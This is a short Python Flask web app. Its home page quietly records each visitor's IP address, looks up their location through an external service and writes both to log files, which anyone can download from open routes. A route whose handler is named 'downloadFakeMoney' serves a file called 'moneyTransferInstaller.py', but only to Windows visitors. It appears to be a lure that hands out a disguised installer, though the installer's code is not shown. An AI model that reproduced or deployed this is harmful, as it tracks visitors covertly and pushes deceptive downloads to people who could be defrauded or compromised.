from datetime import datetime
from flask import Flask, request, render_template
from flask import send_file
import zoneinfo, requests

# Pacific Time
tz = zoneinfo.ZoneInfo("America/Los_Angeles")

now = datetime.now(tz)
formatted = now.strftime("%m-%d-%Y %I:%M %p %S seconds")

app = Flask(__name__)

@app.route("/")
def home():
    user_ip = request.access_route[0]
    url = f"https://api.iplocation.net/?ip={user_ip}"
    headers = {"Accept" : "application/json"}
    response = requests.get(url, headers=headers)
    data = response.json()

    now = datetime.now(tz)
    formatted = now.strftime("%m-%d-%Y %I:%M %p %S seconds")

    with open("json.txt", "a") as f:
        f.write("\n")
        f.write(formatted)
        f.write(": \n")
        f.write(str(data))

    with open("standard.txt", "a") as f:
        f.write("\n")
        f.write(user_ip)
        f.write(formatted)

    return render_template("index.html", ip=user_ip)

@app.route("/json")
def json():
    return send_file("json.txt", as_attachment=True)

@app.route("/standard")
def standard():
    return send_file("standard.txt", as_attachment=True)

@app.route("/downloadMoney")
def downloadFakeMoney():
    user_agent = request.headers.get("User-Agent", "Unknown")
    if "Windows" in user_agent:
        return send_file("moneyTransferInstaller.py", as_attachment=True)
    return "Oops! This download is only available for Windows users."

if __name__ == "__main__":  
    app.run(host="0.0.0.0", port=5000)